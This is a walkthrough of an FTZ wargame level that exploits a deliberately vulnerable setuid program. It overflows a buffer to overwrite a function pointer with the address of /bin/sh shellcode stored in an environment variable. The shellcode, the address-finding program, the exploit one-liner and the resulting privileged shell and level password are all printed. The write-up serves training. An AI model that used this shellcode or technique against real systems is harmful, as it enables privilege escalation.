# Level17

## This level's goal
- Function pointer modulation with the shell code

***

```
[level17@ftz level17]$ ls -l
-rwsr-x---    1 level18  level17     13853 Mar  8  2003 attackme
-rw-r-----    1 root     level17       191 Mar  8  2003 hint

[level17@ftz level17]$ cat hint

#include <stdio.h>

void printit() {
  printf("Hello there!\n");
}

main()
{ 
  int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}
```

The hint seems almost same as level16, but I need to change printit() to egg shell code to exploit this level.

In level16, we could understand the memory size.

buf(20bytes) + dummy(20bytes) + \*printit(4bytes,0xbffff048) + crap(4bytes,0xbffff04c) + dummy(8bytes) + SPF(4bytes) + RET(4bytes).

I will make the env variable of EGG(shell code) and then made and run getegg.c (to get EGG's address).

```
[level17@ftz level17]$ export EGG=`python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

[level17@ftz tmp]$ cat getegg.c
#include <stdlib.h>
main() {
        printf("EGG : %p", getenv("EGG"));
}

[level17@ftz tmp]$ gcc getegg.c -o getegg
[level17@ftz tmp]$ ./getegg
EGG : 0xbffffc8e
```

The shell code address is 0xbffffc8e, so the attack code will be 40bytes dummy strings + shell code's address(0xbffffc8e).

```
[level17@ftz level17]$ (python -c 'print "A"*40+"\x8e\xfc\xff\xbf"'; cat) | ./attackme

id
uid=3098(level18) gid=3097(level17) groups=3097(level17)

my-pass
Level18 Password is "why did you do it".
```
